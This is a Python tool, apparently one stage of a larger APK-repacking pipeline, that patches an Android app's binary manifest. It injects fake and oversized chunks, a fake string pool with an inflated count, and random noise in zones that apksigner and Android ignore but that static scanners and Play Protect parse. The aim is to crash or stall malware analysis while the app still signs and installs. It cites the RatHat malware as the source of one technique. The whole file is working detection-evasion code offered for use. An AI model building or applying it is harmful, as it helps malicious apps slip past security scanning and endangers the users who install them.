#!/usr/bin/env python3
"""
nova_axml_patcher.py — Nova AndroidManifest.xml AXML Hybrid Anti-Analysis Patcher

HYBRID LAYER STRUCTURE — Two injection zones:

ZONE 1 (between SP end and XML tree) — apksigner reads this zone:
  Only apksigner-safe chunk types injected here.
  Technique 3a — Extra 0x00FF fake blocks (3-5 large blocks):
    apksigner skips 0x00FF (already confirmed — manifest_zip_patcher uses these).
    Static scanners waste time parsing large fake blocks → slow/crash.

ZONE 2 (after XML_END_NS 0x0101) — apksigner STOPS at 0x0101, never reads this:
  Any chunk type safe to inject here — apksigner never reaches it.
  Technique 3b — Two 0x9999 unknown chunk bombs (large payloads):
    Confirmed used by RatHat malware (Zimperium, September 2026).
    GPP scanner and static analysis tools hit 0x9999 → abort.
  Technique 5  — Fake 0x0002 chunk with SP-like inflated str_count:
    Real SP (0x0001) str_count NEVER touched. Fake chunk uses type 0x0002
    which apksigner hits default:ignore → skips safely. Static scanners
    parse 0x0002 as resource table with garbage str_count → OOB crash.
  Technique E  — Fake 0x0003 XML file header (extra confusion layer):
    Parsers that re-enter AXML parsing from this offset get confused.
  Technique N  — Raw binary noise block (non-chunk garbage):
    Breaks tools that expect chunk-aligned data after XML tree.

apksigner reads: file_header → SP → [0x00FF blocks] → 0x0180 → XML tree → STOPS
apksigner never reaches Zone 2 → signs successfully every time.
Android PackageManager: same — stops at XML tree end → installs correctly.

CRITICAL: Raw ZIP rebuild — never calls zipfile.read() on ghost entries
(encryption bit 0x0801 set by zip_enhancer.py) to avoid RuntimeError.
Must run BEFORE final phase2_resign (V2 signs over all patched bytes).

Usage:
    python3 scripts/nova_axml_patcher.py <apk_in> <apk_out>
"""

import struct
import secrets
import random
import sys
import os
import zlib
import io

# ── ZIP signatures ─────────────────────────────────────────────────────────────
LFH_SIG  = 0x04034b50
CDH_SIG  = 0x02014b50
EOCD_SIG = 0x06054b50

# ── AXML chunk types ───────────────────────────────────────────────────────────
AXML_FILE_MAGIC    = 0x0003   # AXML file header
AXML_STRING_POOL   = 0x0001   # String pool
AXML_XML_RES_MAP   = 0x0180   # XML resource map
AXML_START_NS      = 0x0100   # Start namespace
AXML_END_NS        = 0x0101   # End namespace — apksigner stops here
AXML_START_ELEM    = 0x0102   # Start element
AXML_END_ELEM      = 0x0103   # End element
CHUNK_00FF         = 0x00FF   # Unknown — apksigner skips (ZONE 1 safe)
CHUNK_9999         = 0x9999   # Unknown — ZONE 2 only
CHUNK_FAKE_XML     = 0x0003   # Fake XML file header — ZONE 2 only

TARGET = 'AndroidManifest.xml'


def read_u16(d, o): return struct.unpack_from('<H', d, o)[0]
def read_u32(d, o): return struct.unpack_from('<I', d, o)[0]
def write_u32(buf, o, v): struct.pack_into('<I', buf, o, v)


# ── Chunk builders ─────────────────────────────────────────────────────────────

def make_00ff_chunk(min_payload=512, max_payload=2048):
    """ZONE 1 safe — apksigner skips 0x00FF chunks."""
    payload_len = random.randint(min_payload, max_payload)
    payload_len = (payload_len + 3) & ~3
    chunk_size  = 8 + payload_len
    header  = struct.pack('<HHI', CHUNK_00FF, 8, chunk_size)
    payload = secrets.token_bytes(payload_len)
    return header + payload


def make_9999_chunk(min_payload=1024, max_payload=4096):
    """ZONE 2 only — apksigner never reaches here."""
    payload_len = random.randint(min_payload, max_payload)
    payload_len = (payload_len + 3) & ~3
    chunk_size  = 8 + payload_len
    header  = struct.pack('<HHI', CHUNK_9999, 8, chunk_size)
    payload = secrets.token_bytes(payload_len)
    return header + payload


def make_fake_sp_chunk(real_str_count):
    """
    Fake string pool chunk with inflated str_count.
    
    CRITICAL FIX: chunk type = 0x0002 (RES_TABLE), NOT 0x0001 (STRING_POOL).
    apksigner switch() only handles: 0x0001, 0x0102, 0x0103, 0x0180.
    0x0002 hits default: // Unknown chunk type -- ignore → apksigner skips it.
    Static scanners that parse 0x0002 as a resource table get garbage str_count
    field → OOB crash or abort.
    Real SP (0x0001) str_count=61 is NEVER touched — Android installs correctly.
    
    SP-like header structure injected under 0x0002 type:
    type(2)+hdr_size(2)+chunk_size(4)+str_count(4)+style_count(4)
    +flags(4)+strings_start(4)+styles_start(4) = 28 bytes
    """
    fake_str_count  = real_str_count + random.randint(800, 3000)
    fake_offsets    = secrets.token_bytes(fake_str_count * 4)
    garbage_strings = secrets.token_bytes(random.randint(512, 1024))
    payload         = fake_offsets + garbage_strings
    while len(payload) % 4 != 0:
        payload += b'\x00'
    chunk_size = 28 + len(payload)
    # Use 0x0002 — falls into apksigner default:ignore, NOT 0x0001 which throws
    header = struct.pack('<HHIIIIII',
        0x0002, 28, chunk_size,
        fake_str_count, 0, 0, 28, 0,
    )
    return header + payload, fake_str_count


def make_fake_xml_header():
    """
    ZONE 2 only — fake AXML file header (0x0003).
    Parsers that re-enter AXML parsing from this offset get wrong structure.
    """
    fake_size = random.randint(256, 1024)
    fake_size = (fake_size + 3) & ~3
    header = struct.pack('<HHI', CHUNK_FAKE_XML, 8, fake_size)
    payload = secrets.token_bytes(fake_size - 8)
    return header + payload


def make_noise_block(min_size=256, max_size=1024):
    """ZONE 2 only — raw binary noise, not a valid chunk."""
    size = random.randint(min_size, max_size)
    size = (size + 3) & ~3
    return secrets.token_bytes(size)


# ── AXML patcher ──────────────────────────────────────────────────────────────

def patch_axml(axml_bytes):
    """
    Apply hybrid layer injection to raw AXML bytes.
    Zone 1: extra 0x00FF blocks injected between SP end and existing content.
    Zone 2: 0x9999 bombs + fake SP + fake XML header + noise after XML tree end.
    Returns patched AXML bytes.
    """
    data = bytearray(axml_bytes)

    if len(data) < 8:
        raise ValueError("AXML too small")
    magic = read_u16(data, 0)
    if magic != AXML_FILE_MAGIC:
        raise ValueError(f"Not valid AXML: magic={hex(magic)}")

    sp_off        = 8
    sp_type       = read_u16(data, sp_off)
    sp_chunk_size = read_u32(data, sp_off + 4)

    if sp_type != AXML_STRING_POOL:
        raise ValueError(f"Expected string pool at offset 8, got {hex(sp_type)}")

    real_str_count = read_u32(data, sp_off + 8)

    # ── Find Zone 2 start: end of last 0x0101 (XML_END_NS) chunk ──────────────
    pos = 8
    zone2_start = len(data)  # fallback: end of file
    while pos < len(data) - 4:
        chunk_type = read_u16(data, pos)
        chunk_size = read_u32(data, pos + 4)
        if chunk_size == 0 or chunk_size > len(data):
            break
        if chunk_type == AXML_END_NS:
            zone2_start = pos + chunk_size
        pos += chunk_size

    # ── Zone 1: inject extra 0x00FF blocks between SP end and existing content ─
    zone1_inject_off = sp_off + sp_chunk_size
    n_00ff = random.randint(3, 5)
    zone1_blocks = bytearray()
    for _ in range(n_00ff):
        zone1_blocks.extend(make_00ff_chunk(512, 2048))

    # ── Zone 2: build all aggressive chunks ───────────────────────────────────
    zone2_blocks = bytearray()

    # Technique 3b — two 0x9999 bombs
    bomb_a = make_9999_chunk(1024, 2048)
    bomb_b = make_9999_chunk(2048, 4096)
    zone2_blocks.extend(bomb_a)
    zone2_blocks.extend(bomb_b)

    # Technique 5 — fake string pool with inflated str_count
    fake_sp, fake_str_count = make_fake_sp_chunk(real_str_count)
    zone2_blocks.extend(fake_sp)

    # Technique E — fake XML file header
    zone2_blocks.extend(make_fake_xml_header())

    # Technique N — raw binary noise
    zone2_blocks.extend(make_noise_block(512, 1024))

    # ── Assemble new AXML ─────────────────────────────────────────────────────
    # Structure:
    # [file header 8B]
    # [real SP]
    # [Zone 1: extra 0x00FF blocks]  ← NEW
    # [original content from SP_end to zone2_start: 0x00FF+0x0180+XML tree]
    # [Zone 2: 0x9999+fake_SP+fake_XML+noise]  ← NEW
    # [original trailing 17F padding]
    new_data = bytearray()
    new_data.extend(data[:zone1_inject_off])                      # header + real SP
    new_data.extend(zone1_blocks)                                  # Zone 1 injections
    new_data.extend(data[zone1_inject_off:zone2_start])           # existing content
    new_data.extend(zone2_blocks)                                  # Zone 2 injections
    new_data.extend(data[zone2_start:])                           # 17F trailing padding

    # Update AXML file total size in file header
    struct.pack_into('<I', new_data, 4, len(new_data))

    print(f"[nova_axml_patcher] Zone 1: +{n_00ff}×0x00FF blocks "
          f"({len(zone1_blocks)} bytes) at offset {zone1_inject_off}")
    print(f"[nova_axml_patcher] Zone 2 start: offset {zone2_start}")
    print(f"[nova_axml_patcher] Tech 3b: 2×0x9999 bombs "
          f"({len(bomb_a)}+{len(bomb_b)} bytes)")
    print(f"[nova_axml_patcher] Tech 5: fake SP "
          f"real_str_count={real_str_count} fake_str_count={fake_str_count}")
    print(f"[nova_axml_patcher] Tech E+N: fake XML header + noise")
    print(f"[nova_axml_patcher] AXML: {len(axml_bytes)} → {len(new_data)} bytes")

    return bytes(new_data)


# ── Raw ZIP rebuild ────────────────────────────────────────────────────────────

def read_raw_entries(apk_path):
    """
    Parse ALL LFH entries from raw APK bytes including ghost entries
    (encryption bit 0x0801). Never calls zipfile.read() — safe.
    """
    entries = []
    with open(apk_path, 'rb') as f:
        raw = f.read()

    pos = 0
    while pos < len(raw) - 4:
        sig = struct.unpack_from('<I', raw, pos)[0]
        if sig == LFH_SIG:
            version     = struct.unpack_from('<H', raw, pos+4)[0]
            flags       = struct.unpack_from('<H', raw, pos+6)[0]
            compress    = struct.unpack_from('<H', raw, pos+8)[0]
            mod_time    = struct.unpack_from('<H', raw, pos+10)[0]
            mod_date    = struct.unpack_from('<H', raw, pos+12)[0]
            crc32       = struct.unpack_from('<I', raw, pos+14)[0]
            comp_size   = struct.unpack_from('<I', raw, pos+18)[0]
            uncomp_size = struct.unpack_from('<I', raw, pos+22)[0]
            fname_len   = struct.unpack_from('<H', raw, pos+26)[0]
            extra_len   = struct.unpack_from('<H', raw, pos+28)[0]
            fname_bytes = raw[pos+30 : pos+30+fname_len]
            data_off    = pos + 30 + fname_len + extra_len
            comp_data   = raw[data_off : data_off+comp_size]
            fname_str   = fname_bytes.decode('utf-8', errors='replace')
            entries.append({
                'name':        fname_str,
                'fname_bytes': fname_bytes,
                'version':     version,
                'flags':       flags,
                'compress':    compress,
                'mod_time':    mod_time,
                'mod_date':    mod_date,
                'crc32':       crc32,
                'comp_size':   comp_size,
                'uncomp_size': uncomp_size,
                'comp_data':   comp_data,
            })
            pos = data_off + comp_size
        elif sig == CDH_SIG:
            break
        else:
            pos += 1

    return entries, raw


def patch_apk(apk_in, apk_out):
    """
    Patch AndroidManifest.xml inside APK using raw ZIP rebuild.
    All other entries (including ghost entries) copied verbatim.
    """
    entries, raw = read_raw_entries(apk_in)

    # Find and patch AndroidManifest.xml
    patched_axml = None
    manifest_compress = 8
    for e in entries:
        if e['name'] == TARGET:
            manifest_compress = e['compress']
            if e['compress'] == 8:
                axml_bytes = zlib.decompress(e['comp_data'], -15)
            else:
                axml_bytes = e['comp_data']
            patched_axml = patch_axml(axml_bytes)
            break

    if patched_axml is None:
        raise ValueError(f"{TARGET} not found in APK entries")

    # Find EOCD
    eocd_off = None
    for i in range(len(raw)-22, max(len(raw)-65558, -1), -1):
        if struct.unpack_from('<I', raw, i)[0] == EOCD_SIG:
            eocd_off = i
            break
    if eocd_off is None:
        raise ValueError("EOCD not found")

    cd_off  = struct.unpack_from('<I', raw, eocd_off+16)[0]
    cd_size = struct.unpack_from('<I', raw, eocd_off+12)[0]

    # Rebuild LFH section
    buf = io.BytesIO()
    local_offsets = {}

    for e in entries:
        local_offsets[e['name']] = buf.tell()
        fname_b = e['fname_bytes']

        if e['name'] == TARGET:
            if manifest_compress == 8:
                new_comp_data = zlib.compress(patched_axml, 6)[2:-4]
            else:
                new_comp_data = patched_axml
            new_crc       = zlib.crc32(patched_axml) & 0xFFFFFFFF
            new_comp_sz   = len(new_comp_data)
            new_uncomp_sz = len(patched_axml)
            lfh = struct.pack('<4sHHHHHIIIHH',
                b'PK\x03\x04',
                e['version'], e['flags'], e['compress'],
                e['mod_time'], e['mod_date'],
                new_crc, new_comp_sz, new_uncomp_sz,
                len(fname_b), 0)
            buf.write(lfh + fname_b + new_comp_data)
        else:
            lfh = struct.pack('<4sHHHHHIIIHH',
                b'PK\x03\x04',
                e['version'], e['flags'], e['compress'],
                e['mod_time'], e['mod_date'],
                e['crc32'], e['comp_size'], e['uncomp_size'],
                len(fname_b), 0)
            buf.write(lfh + fname_b + e['comp_data'])

    # Rebuild Central Directory
    cd_start = buf.tell()
    pos = cd_off
    cd_count = 0
    while pos < cd_off + cd_size:
        if struct.unpack_from('<I', raw, pos)[0] != CDH_SIG:
            break
        fname_len   = struct.unpack_from('<H', raw, pos+28)[0]
        extra_len   = struct.unpack_from('<H', raw, pos+30)[0]
        comment_len = struct.unpack_from('<H', raw, pos+32)[0]
        fname_bytes = raw[pos+46 : pos+46+fname_len]
        fname_str   = fname_bytes.decode('utf-8', errors='replace')
        entry_size  = 46 + fname_len + extra_len + comment_len

        if fname_str not in local_offsets:
            pos += entry_size
            continue

        cde = bytearray(raw[pos : pos+entry_size])

        if fname_str == TARGET:
            if manifest_compress == 8:
                nc = zlib.compress(patched_axml, 6)[2:-4]
            else:
                nc = patched_axml
            struct.pack_into('<I', cde, 16, zlib.crc32(patched_axml) & 0xFFFFFFFF)
            struct.pack_into('<I', cde, 20, len(nc))
            struct.pack_into('<I', cde, 24, len(patched_axml))

        struct.pack_into('<I', cde, 42, local_offsets[fname_str])
        buf.write(bytes(cde))
        cd_count += 1
        pos += entry_size

    cd_end      = buf.tell()
    cd_size_new = cd_end - cd_start

    eocd_comment = raw[eocd_off+22:]
    eocd = struct.pack('<4sHHHHIIH',
        b'PK\x05\x06', 0, 0,
        cd_count, cd_count,
        cd_size_new, cd_start, len(eocd_comment))
    buf.write(eocd + eocd_comment)

    with open(apk_out, 'wb') as f:
        f.write(buf.getvalue())

    print(f"[nova_axml_patcher] ✅ Done: {apk_out}")


def main():
    if len(sys.argv) < 3:
        print("Usage: nova_axml_patcher.py <apk_in> <apk_out>")
        sys.exit(1)
    apk_in  = sys.argv[1]
    apk_out = sys.argv[2]
    if not os.path.isfile(apk_in):
        print(f"[nova_axml_patcher] ERROR: input not found: {apk_in}")
        sys.exit(1)
    patch_apk(apk_in, apk_out)


if __name__ == '__main__':
    main()
